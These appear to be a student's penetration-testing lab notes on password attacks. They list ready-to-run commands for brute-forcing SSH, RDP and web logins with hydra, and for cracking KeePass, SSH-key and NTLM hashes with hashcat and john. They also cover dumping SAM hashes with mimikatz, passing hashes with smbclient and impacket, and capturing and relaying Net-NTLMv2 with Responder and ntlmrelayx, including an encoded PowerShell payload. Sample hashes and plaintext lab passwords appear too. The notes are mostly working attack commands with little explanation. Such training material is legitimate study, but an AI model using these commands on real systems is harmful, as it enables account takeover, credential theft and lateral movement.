---Attacking Network Services Logins---
+++SSH and RDP
We'll attack a single username with -l george, specify the port with -s, indicate our password list with -P and define our target with ssh://192.168.50.201:
$ hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201

We'll again use hydra, setting a list of usernames with -L /usr/share/wordlists/dirb/others/names.txt (which contains over eight thousand username entries) and try a single password with -p "SuperS3cure1337#". We'll use the RDP protocol this time and set the target with rdp://192.168.50.202.
$ hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202

+++HTTP POST Login Form
$ hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"

---Password Cracking Fundamentals---
+++Mutating Wordlists
$ echo \$1 > demo.rule
$ hashcat -r demo.rule --stdout demo.txt
$ hashcat -m 0 crackme.txt /usr/share/wordlists/rockyou.txt -r demo3.rule --force

Hashcat rule dir
$ ls -la /usr/share/hashcat/rules/

+++Cracking Methodology

+++Password Manager
Let's use PowerShell with the Get-ChildItem cmdlet to locate files in specified locations. We'll use -Path C:\ to search the whole drive. Next, we'll use -Include to specify the file types we want to include, -File and -Recurse arguments to get a list of files and search in subdirectories. Finally we'll set -ErrorAction to SilentlyContinue to silence errors and continue execution
PS> Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
$ keepass2john Database.kdbx > keepass.hash
$ cat keepass.hash   
Database:$keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9aec6bd*04b0bfd787898d8dcd4d463ee768e55337ff001ddfac98c961219d942fb0cfba*5273cc73b9584fbd843d1ee309d2ba47*1dcad0a3e50f684510c5ab14e1eecbb63671acae14a77eff9aa319b63d71ddb9*17c3ebc9c4c3535689cb9cb501284203b7c66b0ae2fbf0c2763ee920277496c1

Crack
$ hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force

+++SSH Private Key Passphrase
Following the cracking methodology, our next step is to transform the private key into a hash format for our cracking tools. We'll use the ssh2john transformation script from the JtR suite and save the resulting hash to ssh.hash.
$ ssh2john id_rsa > ssh.hash
$ $ cat ssh.hash
id_rsa:$sshng$6$16$7059e78a8d3764ea1e883fcdf592feb7$1894$6f70656e7373682d6b65792d7631000000000a6165733235362d6374720000000662637279707400000018000000107059e78a8d3764ea1e883fcdf592feb7000000100000000100000197000000077373682...
$ hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule --force

Or john to crack
$ john --wordlist=ssh.passwords --rules=sshRules ssh.hash

---Working with Password Hashes---
+++Cracking NTLM
PS> Get-LocalUser
PS> .\mimikatz.exe
PS> privilege::debug

We can use various commands to extract passwords from the system. One of the most common Mimikatz commands is sekurlsa::logonpasswords, which attempts to extract plaintext passwords and password hashes from all available sources. Since this generates a huge amount of output, we'll instead use lsadump::sam, which will extract the NTLM hashes from the SAM. For this command, we must first enter token::elevate to elevate to SYSTEM user privileges.

We must have the SeDebugPrivilege access right enabled for sekurlsa::logonpasswords and lsadump::sam. We'll enable this with privilege::debug
PS> token::elevate
PS> lsadump::sam

Crack NTLM
$ hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

+++Passing NTLM
To use the command, we need to enter the path of the share as the first argument by escaping the backslashes. In this case, we will enter \\\\192.168.59.212\\secrets. We'll use the -U Administrator to set the user and --pw-nt-hash to indicate the hash.

After we successfully connect to the SMB share "secrets" with smbclient, we can list all files in the SMB share with dir. We can also use the get command to download files to our Kali machine.
$ smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
OR
$ impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
OR
$ impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212

+++Cracking Net-NTLMv2
Let's do this now. First, we'll need to run ip a to retrieve a list of all interfaces. Then, we'll run responder (which is already pre-installed on Kali) as sudo to enable permissions needed to handle privileged raw socket operations for the various protocols. We'll set the listening interface with -I, noting that your interface name may differ from what's shown here.
$ sudo responder -I tap0

WINDOW-cmd: dir \\192.168.119.2\test
Crack
$ hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force

+++Relaying Net-NTLMv2
$ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc JABjAGwAaQBlAG4AdA..."

WINDOW-cmd: dir \\192.168.119.2\test -> to get ntlm hash

+++Windows Credential Guard
$ xfreerdp /u:"CORP\\Administrator" /p:"QWERTY123\!@#" /v:192.168.50.246 /dynamic-resolution   
Link kali with drive Z
$ xfreerdp +clipboard /u:charlotte /p:'Game2On4.!' /v:192.168.165.96 /drive:Z,/home/kali/Work/OSCP

$ impacket-wmiexec -debug -hashes 00000000000000000000000000000000:160c0b16dd0ee77e7c494e38252f7ddf CORP/Administrator@192.168.50.248

